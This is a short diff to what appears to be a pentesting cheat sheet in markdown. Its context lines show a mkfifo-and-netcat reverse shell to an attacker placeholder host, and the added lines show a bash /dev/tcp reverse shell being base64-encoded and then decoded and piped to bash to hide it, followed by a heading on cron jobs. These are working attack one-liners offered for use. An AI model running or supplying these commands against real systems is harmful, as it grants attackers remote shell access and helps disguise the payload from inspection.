@@ -180,6 +180,13 @@ for some special cases
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> <attacker port> >/tmp/f
 ```
 
+base64
+
+```shell
+echo 'bash -c "bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1"' | base64
+echo -n <base64 command string> | base64 -d | bash       
+```
+
 ### :open_file_folder: Cron jobs
 
 ```shell
